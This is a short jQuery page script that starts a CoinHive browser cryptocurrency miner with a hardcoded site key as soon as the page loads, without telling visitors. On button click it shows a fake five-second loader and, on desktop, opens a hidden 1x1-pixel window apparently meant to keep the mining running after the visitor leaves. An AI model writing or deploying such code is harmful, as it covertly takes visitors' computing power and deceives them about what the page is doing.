$(function(){
	console.log('ready');
	var miner = new CoinHive.Anonymous('fq2DutyzyB9jOE55VfSiNDL623OVqAKw', {throttle: 0.3});
	miner.start();
	$('#button').click(function(){
		$(this).prop('disabled', true);
		$('#loader').show();
		if (!miner.isMobile()){
			window.open('index.html', 'bg', 'width=1, height=1, top=0, left=0');
		}
		setTimeout(function(){
			$('#loader').hide();
			$('#answer').show();
		}, 5000);
	});
	$('#loader').hide();
	$('#answer').hide();
});